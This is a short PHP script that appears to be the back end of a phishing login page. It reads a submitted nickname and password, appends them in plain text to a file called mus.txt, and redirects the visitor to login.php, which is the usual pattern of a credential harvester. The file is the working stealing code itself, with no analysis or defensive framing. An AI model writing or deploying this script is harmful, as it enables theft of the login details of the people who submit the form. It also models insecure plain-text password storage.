<?php 
if($your = $_POST['nick']){
 if($passw = $_POST['pass']){
    
 
$arck = fopen("mus.txt",'a');
fwrite($arck,"$your,$passw \n");
fclose($arck);

header('Location:login.php');
}else{
  echo $_SERVER['HTTP_USER_AGENT'];
}
}else{
  echo "ERROR:create pascreate";
}